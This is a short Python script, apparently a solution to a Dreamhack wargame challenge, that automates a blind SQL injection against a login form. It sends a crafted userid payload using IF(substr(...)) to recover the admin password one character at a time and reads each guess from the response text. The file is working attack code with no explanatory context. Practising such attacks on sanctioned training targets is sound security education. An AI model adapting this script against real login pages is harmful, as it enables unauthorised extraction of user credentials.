import requests
import string
from alive_progress import alive_bar

def main() :
    URL = "http://host3.dreamhack.games:9700/login"

    result = ""

    with alive_bar(19) as bar :
        for i in range(1, 20) :
            for ch in string.printable :
                # print(f"i : {i}, ch : {ch}")
                # guest' and upw = IF (substr((SELECT upw FROM user_table WHERE uid = 'admin'), 1, 1) = 'b', 'guest', 'noguest')-- -
                
                payload = f"guest\' and userpassword = IF (substr((SELECT userpassword FROM users WHERE userid = \'admin\'), {i}, 1) = \'{ch}\', \'guest\', \'noguest\')-- -"

                data = {
                    "userid" : payload,
                    "userpassword" : "test"
                }

                # data = {
                #     "userid" : "guest",
                #     "userpassword" : "guest"
                # }

                print("payload", payload)

                response = requests.post(URL, data=data, verify=False)
                print(response.text)
                if "wrong" not in response.text :
                    print(ch)
                    result += ch
                    break
            bar()

    print(f"result :{result}")

    return


if __name__ == "__main__" :
    main()